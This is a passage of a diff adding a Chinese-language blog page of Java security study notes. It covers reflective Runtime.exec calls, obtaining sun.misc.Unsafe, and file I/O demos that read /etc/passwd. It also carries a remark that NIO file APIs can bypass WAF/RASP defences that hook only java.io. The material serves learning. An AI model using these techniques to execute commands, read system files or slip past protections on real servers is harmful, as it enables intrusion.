+        Constructor constructor = runtimeClass1.getDeclaredConstructor();
+        constructor.setAccessible(true);
+
+        // 创建Runtime类示例，等价于 Runtime rt = new Runtime();
+        Object runtimeInstance = constructor.newInstance();
+
+        // 获取Runtime的exec(String cmd)方法
+        Method runtimeMethod = runtimeClass1.getMethod(&quot;exec&quot;, String.class);
+
+        // 调用exec方法，等价于 rt.exec(cmd);
+        Process process = (Process) runtimeMethod.invoke(runtimeInstance, &quot;whoami&quot;);
+
+        // 获取命令执行结果
+        InputStream in = process.getInputStream();
+
+        // 输出命令执行结果
+        System.out.println(org.apache.commons.io.IOUtils.toString(in, &quot;UTF-8&quot;));
+    }
+}
+
+</code></pre>
+<p>反射调用Runtime实现本地命令执行的流程如下：</p>
+<ol>
+<li>反射获取Runtime类对象(Class.forName(&quot;java.lang.Runtime&quot;))。</li>
+<li>使用Runtime类的Class对象获取Runtime类的无参数构造方法(getDeclaredConstructor())，因为Runtime的构造方法是private的我们无法直接调用，所以我们需要通过反射去修改方法的访问权限(constructor.setAccessible(true))。</li>
+<li>获取Runtime类的exec(String)方法(runtimeClass1.getMethod(&quot;exec&quot;, String.class)😉。</li>
+<li>调用exec(String)方法(runtimeMethod.invoke(runtimeInstance, cmd))。</li>
+</ol>
+<p>注意，这个代码只有在java版本小于9才能运行。从Java 9开始，通过Java平台模块系统（JPMS）引入了更严格的访问控制，这使得访问某些核心类库的内部API变得更加受限。特别是，它不允许你通过反射来调用一个模块的非公共部分，除非该模块被显式地打开给调用的模块。</p>
+<p>另外setAccessible是反射类的一个方法，不是runtime类提供的。</p>
+<p><strong>Runtime类构造方法示例代码片段:</strong></p>
+<pre><code class="language-java">public class Runtime {
+
+   /** Don't let anyone else instantiate this class */
+  private Runtime() {}
+
+}
+</code></pre>
+<p><strong>私有</strong>的类构造方法，不能使用Runtime rt = new Runtime();的方式创建Runtime对象。</p>
+<p><code>runtimeClass1.getDeclaredConstructor</code>和<code>runtimeClass1.getConstructor</code>都可以获取到类构造方法，区别在于后者无法获取到私有方法。反射类创建实例：</p>
+<pre><code class="language-java">constructor.newInstance()
+</code></pre>
+<p><strong>获取当前类所有的成员方法</strong><br>
+getMethod和getDeclaredMethod都能够获取到类成员方法，区别在于getMethod只能获取到<strong>当前类和父类</strong>的所有有权限的方法(如：public)，而getDeclaredMethod能获取到当前类的所有成员方法(<strong>不包含父类</strong>)。</p>
+<pre><code class="language-java">Method method = clazz.getDeclaredMethod(&quot;方法名&quot;);
+Method method = clazz.getDeclaredMethod(&quot;方法名&quot;, 参数类型如String.class，多个参数用&quot;,&quot;号隔开);
+</code></pre>
+<p><strong>反射调用方法</strong><br>
+通过Method的invoke方法来调用类方法，<code>method.invoke</code>的第一个参数必须是类实例对象，如果调用的是<code>static</code>方法那么第一个参数值可以传<code>null</code>。</p>
+<pre><code class="language-java">method.invoke(方法实例对象, 方法参数值，多个参数值用&quot;,&quot;隔开);
+</code></pre>
+<p><strong>获取当前类的所有成员变量</strong></p>
+<pre><code class="language-java">Field fields = clazz.getDeclaredFields();
+</code></pre>
+<p><strong>获取当前类指定的成员变量：</strong></p>
+<pre><code class="language-java">Field field  = clazz.getDeclaredField(&quot;变量名&quot;);
+</code></pre>
+<p>getField和getDeclaredField的区别同getMethod和getDeclaredMethod。</p>
+<p><strong>获取成员变量值：</strong></p>
+<pre><code class="language-java">Object obj = field.get(类实例对象);
+</code></pre>
+<p><strong>修改成员变量值：</strong></p>
+<pre><code class="language-java">field.set(类实例对象, 修改后的值);
+</code></pre>
+<p>同理，当我们没有修改的成员变量权限时可以使用: field.setAccessible(true)的方式修改为访问成员变量访问权限。</p>
+<h1 id="sunmiscunsafe">sun.misc.Unsafe</h1>
+<h2 id="获取unsafe对象">获取Unsafe对象</h2>
+<pre><code class="language-java">import sun.reflect.CallerSensitive;
+import sun.reflect.Reflection;
+
+public final class Unsafe {
+
+    private static final Unsafe theUnsafe;
+
+    static {
+        theUnsafe = new Unsafe();
+        省去其他代码......
+    }
+
+    private Unsafe() {
+    }
+
+    @CallerSensitive
+    public static Unsafe getUnsafe() {
+        Class var0 = Reflection.getCallerClass();
+        if (var0.getClassLoader() != null) {
+            throw new SecurityException(&quot;Unsafe&quot;);
+        } else {
+            return theUnsafe;
+        }
+    }
+
+    省去其他代码......
+}
+
+</code></pre>
+<p><strong>反射获取Unsafe类实例代码实验：</strong></p>
+<pre><code class="language-java">package reflect;
+
+import sun.misc.Unsafe;
+import java.lang.reflect.Field;
+
+public class TestUnsafe {
+    static class TestClass {
+        private TestClass() {
+            System.out.println(&quot;TestClass private constructor&quot;);
+        }
+    }
+
+    public static void main(String[] args) throws Exception {
+        // 反射获取Unsafe的theUnsafe成员变量
+        Field theUnsafeField = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);
+
+        // 反射设置theUnsafe访问权限
+        theUnsafeField.setAccessible(true);
+
+        // 反射获取theUnsafe成员变量值
+        Unsafe unsafe = (Unsafe) theUnsafeField.get(null);
+
+        // 使用Unsafe来实例化TestClass，allocateInstance会绕过类的构造方法去实例一个类
+        TestClass testInstance = (TestClass) unsafe.allocateInstance(TestClass.class);
+        System.out.println(&quot;Instance created: &quot; + testInstance);
+    }
+}
+
+</code></pre>
+<p><strong>关于(Unsafe) theUnsafeField.get(null);</strong><br>
+<strong>Field</strong> 类的 <strong>get</strong> 方法允许你动态地获取字段的值。当你调用 <strong>get</strong> 方法时，你需要传递一个对象作为参数，该对象代表你想要获取字段值的类的实例。但是，对于静态字段，你不需要实例对象来获取字段的值，因此你可以传递 <strong>null</strong> 作为 <strong>get</strong> 方法的参数。</p>
+<p>也可以用反射创建Unsafe类实例的方式去获取Unsafe对象：</p>
+<pre><code class="language-java">// 获取Unsafe无参构造方法
+Constructor constructor = Unsafe.class.getDeclaredConstructor();
+
+// 修改构造方法访问权限
+constructor.setAccessible(true);
+
+// 反射创建Unsafe类实例，等价于 Unsafe unsafe1 = new Unsafe();
+Unsafe unsafe1 = (Unsafe) constructor.newInstance();
+</code></pre>
+<h2 id=""></h2>
+<p>defineClass直接调用JVM创建类对象<br>
+如果ClassLoader被限制的情况下我们还可以使用Unsafe的defineClass方法来实现同样的功能。</p>
+<p>Unsafe提供了一个通过传入类名、类字节码的方式就可以定义类的defineClass方法：</p>
+<ul>
+<li>public native Class defineClass(String var1, byte[] var2, int var3, int var4);</li>
+<li>public native Class&lt;?&gt; defineClass(String var1, byte[] var2, int var3, int var4, ClassLoader var5, ProtectionDomain var6);</li>
+</ul>
+<p><strong>使用Unsafe创建TestHelloWorld对象：</strong></p>
+<pre><code class="language-java">// 使用Unsafe向JVM中注册com.anbai.sec.classloader.TestHelloWorld类
+Class helloWorldClass = unsafe1.defineClass(TEST_CLASS_NAME, TEST_CLASS_BYTES, 0, TEST_CLASS_BYTES.length);
+</code></pre>
+<h1 id="java-文件系统">Java 文件系统</h1>
+<p>**JNI：**JNI（Java Native Interface）是一个标准的编程框架，允许Java代码与其他语言编写的代码进行交互和集成，最常见的是C和C++。这</p>
+<p>**native方法：**在 Java 中，<strong>native</strong> 关键字用于声明一个方法是在 Java 之外的代码中实现的，通常是在 C 或 C++ 中。这允许 Java 通过 JNI（Java Native Interface）与已有的库或特定于平台的功能交互。</p>
+<p>在Java SE中内置了两类文件系统：java.io和java.nio，java.nio的实现是sun.nio，文件系统底层的API实现如下图：<br>
+<img src="https://skyblu3519.github.io/post-images/1694965002636.png" alt="" loading="lazy"><br>
+Java抽象出了一个叫做文件系统的对象:java.io.FileSystem，不同的操作系统有不一样的文件系统,例如Windows和Unix就是两种不一样的文件系统： java.io.UnixFileSystem、java.io.WinNTFileSystem。</p>
+<p>Java只是<strong>实现了对文件操作的封装</strong>而已，最终读写文件的实现都是通过<strong>调用native方法</strong>实现的。</p>
+<p>不过需要特别注意一下几点：</p>
+<ol>
+<li>并不是所有的文件操作都在java.io.FileSystem中定义,文件的读取最终调用的是java.io.FileInputStream#read0、readBytes、java.io.RandomAccessFile#read0、readBytes,而写文件调用的是java.io.FileOutputStream#writeBytes、java.io.RandomAccessFile#write0。</li>
+<li>Java有两类文件系统API！一个是基于阻塞模式的IO的文件系统，另一是JDK7+基于NIO.2的文件系统。</li>
+</ol>
+<p>Java 7提出了一个基于NIO的文件系统，这个NIO文件系统和阻塞IO文件系统两者是<strong>完全独立</strong>的。合理的利用NIO文件系统这一特性我们可以绕过某些只是防御了java.io.FileSystem的WAF/RASP。</p>
+<h2 id="读写文件实验">读写文件实验</h2>
+<h3 id="fileinputstream">FileInputStream</h3>
+<pre><code class="language-java">package filesystem;
+
+import java.io.*;
+
+public class FileInputStreamDemo {
+    public static void main(String[] args) throws IOException {
+        File file = new File(&quot;/etc/passwd&quot;);
+
+        // 打开文件对象并创建文件输入流
+        FileInputStream fis = new FileInputStream(file);
+
+        // 定义每次输入流读取到的字节数对象
+        int a = 0;
+
+        // 定义缓冲区大小
+        byte[] bytes = new byte[1024];
+
+        // 创建二进制输出流对象
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+
+        // 循环读取文件内容
+        while ((a = fis.read(bytes)) != -1) {
+            // 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的
+            // 下标0开始截取，a表示输入流read到的字节数。
+            out.write(bytes, 0, a);
+        }
+
+        System.out.println(out.toString());
+    }
+}
+
+</code></pre>
+<h3 id="fileoutputstream">FileOutputStream</h3>
+<pre><code class="language-java">package filesystem;
+
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+
+public class FileOutputStreamDemo {
+    public static void main(String[] args) throws IOException {
+        // 定义写入文件路径
+        File file = new File(&quot;./1.txt&quot;);
+
+        // 定义待写入文件内容
+        String content = &quot;Hello World.&quot;;
+
+        // 创建FileOutputStream对象
+        FileOutputStream fos = new FileOutputStream(file);
+
+        // 写入内容二进制到文件
+        fos.write(content.getBytes());
+        fos.flush();
+        fos.close();
+    }
+}
+
+</code></pre>
+<h3 id="randomaccessfile">RandomAccessFile</h3>
+<p>java.io.FileInputStream既可以读取文件，而且还可以写文件。</p>
+<pre><code class="language-java">package filesystem;
+
+import java.io.*;
+
+public class RandomAccessFileDemo {
+
+    public static void main(String[] args) {
+        // 读文件
+        File file = new File(&quot;/etc/passwd&quot;);
+
+        try {
+            // 创建RandomAccessFile对象,r表示以只读模式打开文件，一共有:r(只读)、rw(读写)、
+            // rws(读写内容同步)、rwd(读写内容或元数据同步)四种模式。
+            RandomAccessFile raf = new RandomAccessFile(file, &quot;r&quot;);
+
+            // 定义每次输入流读取到的字节数对象
+            int a = 0;
+
+            // 定义缓冲区大小
+            byte[] bytes = new byte[1024];
+
+            // 创建二进制输出流对象
+            ByteArrayOutputStream out = new ByteArrayOutputStream();
+
+            // 循环读取文件内容
+            while ((a = raf.read(bytes)) != -1) {
+                // 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的
+                // 下标0开始截取，a表示输入流read到的字节数。
+                out.write(bytes, 0, a);
+            }
+
+            System.out.println(out.toString());
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+        
+        // 写文件
+        File file2 = new File(&quot;./test.txt&quot;);
+
+        // 定义待写入文件内容
+        String content = &quot;Hello World.&quot;;
+
+        try {
+            // 创建RandomAccessFile对象,rw表示以读写模式打开文件，一共有:r(只读)、rw(读写)、
+            // rws(读写内容同步)、rwd(读写内容或元数据同步)四种模式。
+            RandomAccessFile raf = new RandomAccessFile(file2, &quot;rw&quot;);
+
+            // 写入内容二进制到文件
+            raf.write(content.getBytes());
+            raf.close();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+}
+</code></pre>
+<h3 id="filesystemprovider">FileSystemProvider</h3>
+<p>前面章节提到了JDK7新增的NIO.2的java.nio.file.spi.FileSystemProvider,利用FileSystemProvider我们可以利用支持异步的通道(Channel)模式读取文件内容。</p>
+<h2 id="java-文件名空字节截断漏洞">Java 文件名空字节截断漏洞</h2>
+<p>2013年9月10日发布的Java SE 7 Update 40修复了空字节截断这个历史遗留问题。此次更新在java.io.File类中添加了一个isInvalid方法，专门检测文件名中是否包含了空字节。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#classloader">ClassLoader</a>
+<ul>
+<li><a href="#%E5%9F%BA%E7%A1%80%E7%9A%84%E5%9F%BA%E7%A1%80">基础的基础</a></li>
+<li><a href="#classloader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B">ClassLoader类加载流程</a></li>
+<li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89classloader">自定义ClassLoader</a>
+<ul>
+<li><a href="#%E9%87%8D%E5%86%99findclass">重写findClass</a></li>
+</ul>
+</li>
+<li><a href="#urlclassloader">URLClassLoader</a></li>
+<li><a href="#%E7%B1%BB%E5%8A%A0%E8%BD%BD%E9%9A%94%E7%A6%BB">类加载隔离</a>
+<ul>
+<li><a href="#%E8%B7%A8%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8A%A0%E8%BD%BD">跨类加载器加载</a></li>
+</ul>
+</li>
+<li><a href="#jsp%E8%87%AA%E5%AE%9A%E4%B9%89%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%90%8E%E9%97%A8">JSP自定义类加载后门</a></li>
+<li><a href="#%E5%BE%85%E5%8A%9E">待办</a></li>
+</ul>
+</li>
+<li><a href="#java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6">Java反射机制</a>
+<ul>
+<li><a href="#%E8%8E%B7%E5%8F%96class%E5%AF%B9%E8%B1%A1">获取Class对象</a></li>
+<li><a href="#%E5%8F%8D%E5%B0%84javalangruntime">反射java.lang.Runtime</a></li>
+</ul>
+</li>
+<li><a href="#sunmiscunsafe">sun.misc.Unsafe</a>
+<ul>
+<li><a href="#%E8%8E%B7%E5%8F%96unsafe%E5%AF%B9%E8%B1%A1">获取Unsafe对象</a></li>
+<li></li>
+</ul>
+</li>
+<li><a href="#java-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F">Java 文件系统</a>
+<ul>
+<li><a href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6%E5%AE%9E%E9%AA%8C">读写文件实验</a>
+<ul>
+<li><a href="#fileinputstream">FileInputStream</a></li>
+<li><a href="#fileoutputstream">FileOutputStream</a></li>
+<li><a href="#randomaccessfile">RandomAccessFile</a></li>
+<li><a href="#filesystemprovider">FileSystemProvider</a></li>
+</ul>
+</li>
+<li><a href="#java-%E6%96%87%E4%BB%B6%E5%90%8D%E7%A9%BA%E5%AD%97%E8%8A%82%E6%88%AA%E6%96%AD%E6%BC%8F%E6%B4%9E">Java 文件名空字节截断漏洞</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/nctf2019sqli/">
+              <h3 class="post-title">
+                [NCTF2019]SQLi
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
